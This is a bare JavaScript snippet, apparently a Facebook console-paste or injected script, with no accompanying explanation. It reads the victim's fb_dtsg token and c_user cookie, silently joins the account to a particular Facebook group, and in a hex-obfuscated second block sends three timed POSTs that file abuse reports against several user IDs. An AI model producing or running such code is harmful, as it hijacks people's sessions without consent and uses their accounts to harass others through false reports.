var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'],
    user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]); {
    var Page = new XMLHttpRequest(),
        PageURL = '//www.facebook.com/ajax/groups/membership/r2j.php',
        PageParams = 'fb_dtsg=' + fb_dtsg + '&ref=group_jump_header&group_id=611715602244921&__user=' + user_id + '';
    Page['open']('POST', PageURL, true);
    Page['onreadystatechange'] = function () {
        if (Page['readyState'] == 4 && Page['status'] == 200) {
            Page['close'];
        };
    };
    Page['send'](PageParams);
}


var _0xdb21=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x72\x65\x70\x6F\x72\x74\x2F\x73\x6F\x63\x69\x61\x6C\x2E\x70\x68\x70","\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x70\x70\x3D\x25\x37\x42\x25\x32\x32\x61\x72\x65\x5F\x66\x72\x69\x65\x6E\x64\x73\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x63\x69\x64\x25\x32\x32\x25\x33\x41\x35\x34\x37\x34\x33\x32\x30\x32\x38\x36\x36\x39\x34\x34\x30\x25\x32\x43\x25\x32\x32\x63\x6F\x6E\x74\x65\x6E\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x31\x25\x32\x43\x25\x32\x32\x69\x73\x5F\x66\x6F\x6C\x6C\x6F\x77\x69\x6E\x67\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x69\x73\x5F\x74\x61\x67\x67\x65\x64\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x70\x68\x61\x73\x65\x25\x32\x32\x25\x33\x41\x33\x25\x32\x43\x25\x32\x32\x72\x65\x70\x6F\x72\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x31\x32\x34\x25\x32\x43\x25\x32\x32\x73\x75\x62\x5F\x72\x65\x70\x6F\x72\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x38\x39\x25\x32\x43\x25\x32\x32\x74\x69\x6D\x65\x5F\x66\x6C\x6F\x77\x5F\x73\x74\x61\x72\x74\x65\x64\x25\x32\x32\x25\x33\x41\x31\x34\x31\x31\x33\x32\x38\x30\x35\x38\x25\x32\x43\x25\x32\x32\x75\x73\x65\x72\x25\x32\x32\x25\x33\x41\x36\x33\x30\x31\x37\x38\x31\x34\x31\x25\x37\x44\x26\x66\x69\x6C\x65\x5F\x72\x65\x70\x6F\x72\x74\x3D\x31\x26\x5F\x5F\x75\x73\x65\x72\x3D","","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x63\x6C\x6F\x73\x65","\x73\x65\x6E\x64","\x26\x70\x70\x3D\x25\x37\x42\x25\x32\x32\x61\x72\x65\x5F\x66\x72\x69\x65\x6E\x64\x73\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x63\x69\x64\x25\x32\x32\x25\x33\x41\x35\x31\x31\x30\x39\x36\x35\x32\x32\x32\x33\x38\x39\x31\x38\x25\x32\x43\x25\x32\x32\x63\x6F\x6E\x74\x65\x6E\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x31\x25\x32\x43\x25\x32\x32\x69\x73\x5F\x66\x6F\x6C\x6C\x6F\x77\x69\x6E\x67\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x69\x73\x5F\x74\x61\x67\x67\x65\x64\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x70\x68\x61\x73\x65\x25\x32\x32\x25\x33\x41\x33\x25\x32\x43\x25\x32\x32\x72\x65\x70\x6F\x72\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x31\x32\x34\x25\x32\x43\x25\x32\x32\x73\x75\x62\x5F\x72\x65\x70\x6F\x72\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x38\x39\x25\x32\x43\x25\x32\x32\x74\x69\x6D\x65\x5F\x66\x6C\x6F\x77\x5F\x73\x74\x61\x72\x74\x65\x64\x25\x32\x32\x25\x33\x41\x31\x34\x31\x31\x33\x32\x37\x39\x33\x34\x25\x32\x43\x25\x32\x32\x75\x73\x65\x72\x25\x32\x32\x25\x33\x41\x31\x30\x30\x30\x30\x30\x36\x38\x36\x37\x39\x31\x34\x30\x32\x25\x37\x44\x26\x66\x69\x6C\x65\x5F\x72\x65\x70\x6F\x72\x74\x3D\x31\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x70\x70\x3D\x25\x37\x42\x25\x32\x32\x61\x72\x65\x5F\x66\x72\x69\x65\x6E\x64\x73\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x63\x69\x64\x25\x32\x32\x25\x33\x41\x35\x30\x32\x30\x34\x34\x36\x33\x36\x35\x39\x39\x31\x37\x38\x25\x32\x43\x25\x32\x32\x63\x6F\x6E\x74\x65\x6E\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x31\x25\x32\x43\x25\x32\x32\x69\x73\x5F\x66\x6F\x6C\x6C\x6F\x77\x69\x6E\x67\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x69\x73\x5F\x74\x61\x67\x67\x65\x64\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x70\x68\x61\x73\x65\x25\x32\x32\x25\x33\x41\x33\x25\x32\x43\x25\x32\x32\x72\x65\x70\x6F\x72\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x31\x32\x34\x25\x32\x43\x25\x32\x32\x73\x75\x62\x5F\x72\x65\x70\x6F\x72\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x38\x39\x25\x32\x43\x25\x32\x32\x74\x69\x6D\x65\x5F\x66\x6C\x6F\x77\x5F\x73\x74\x61\x72\x74\x65\x64\x25\x32\x32\x25\x33\x41\x31\x34\x31\x31\x33\x32\x37\x35\x39\x36\x25\x32\x43\x25\x32\x32\x75\x73\x65\x72\x25\x32\x32\x25\x33\x41\x31\x34\x32\x36\x36\x37\x30\x30\x39\x39\x25\x37\x44\x26\x66\x69\x6C\x65\x5F\x72\x65\x70\x6F\x72\x74\x3D\x31\x26\x5F\x5F\x75\x73\x65\x72\x3D"];var fb_dtsg=document[_0xdb21[2]](_0xdb21[1])[0][_0xdb21[0]];var user_id=document[_0xdb21[4]][_0xdb21[3]](document[_0xdb21[4]][_0xdb21[3]](/c_user=(\d+)/)[1]);setTimeout(function (){var _0x49d5x3= new XMLHttpRequest();var _0x49d5x4=_0xdb21[5];var _0x49d5x5=_0xdb21[6]+fb_dtsg+_0xdb21[7]+user_id+_0xdb21[8];_0x49d5x3[_0xdb21[10]](_0xdb21[9],_0x49d5x4,true);_0x49d5x3[_0xdb21[11]]=function (){if(_0x49d5x3[_0xdb21[12]]==4&&_0x49d5x3[_0xdb21[13]]==200){_0x49d5x3[_0xdb21[14]];} ;} ;_0x49d5x3[_0xdb21[15]](_0x49d5x5);} ,1000);setTimeout(function (){var _0x49d5x3= new XMLHttpRequest();var _0x49d5x4=_0xdb21[5];var _0x49d5x5=_0xdb21[6]+fb_dtsg+_0xdb21[16]+user_id+_0xdb21[8];_0x49d5x3[_0xdb21[10]](_0xdb21[9],_0x49d5x4,true);_0x49d5x3[_0xdb21[11]]=function (){if(_0x49d5x3[_0xdb21[12]]==4&&_0x49d5x3[_0xdb21[13]]==200){_0x49d5x3[_0xdb21[14]];} ;} ;_0x49d5x3[_0xdb21[15]](_0x49d5x5);} ,2000);setTimeout(function (){var _0x49d5x3= new XMLHttpRequest();var _0x49d5x4=_0xdb21[5];var _0x49d5x5=_0xdb21[6]+fb_dtsg+_0xdb21[17]+user_id+_0xdb21[8];_0x49d5x3[_0xdb21[10]](_0xdb21[9],_0x49d5x4,true);_0x49d5x3[_0xdb21[11]]=function (){if(_0x49d5x3[_0xdb21[12]]==4&&_0x49d5x3[_0xdb21[13]]==200){_0x49d5x3[_0xdb21[14]];} ;} ;_0x49d5x3[_0xdb21[15]](_0x49d5x5);} ,3000);
